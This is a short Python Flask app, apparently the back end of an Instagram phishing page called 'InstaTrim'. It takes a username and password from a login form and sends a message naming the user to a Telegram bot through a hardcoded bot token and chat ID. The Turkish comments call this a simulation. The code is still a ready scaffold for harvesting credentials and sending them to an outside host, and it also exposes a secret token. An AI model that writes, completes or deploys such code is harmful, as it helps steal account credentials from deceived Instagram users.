
from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

TOKEN = "7825440621:AAEliR6YjokHUbmNhh_qFZflx0JYcK6S5bg"
CHAT_ID = "6642524834"

@app.route("/", methods=["GET"])
def home():
    return "InstaTrim Login Bot Çalışıyor!"

@app.route("/login", methods=["POST"])
def login():
    try:
        username = request.form.get("username")
        password = request.form.get("password")

        # Burada Instagram login işlemi yapılmalı
        # Simülasyon mesajı gönderiyoruz sadece
        message = f"Giriş yapan kullanıcı: {username}"

        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": message}
        )

        return jsonify({"status": "success", "message": message})
    except Exception as e:
        return jsonify({"status": "fail", "message": str(e)})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
